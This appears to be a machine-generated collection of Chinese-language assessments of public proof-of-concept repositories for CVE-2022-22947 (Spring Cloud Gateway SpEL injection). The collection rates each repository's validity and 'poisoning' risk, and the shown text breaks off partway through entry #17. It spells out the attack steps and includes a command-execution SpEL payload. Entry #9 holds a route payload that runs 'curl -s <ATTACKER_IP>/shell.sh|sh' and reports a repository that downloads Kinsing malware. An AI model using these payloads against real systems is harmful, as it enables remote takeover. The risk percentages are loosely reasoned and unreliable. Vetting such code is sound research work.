**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
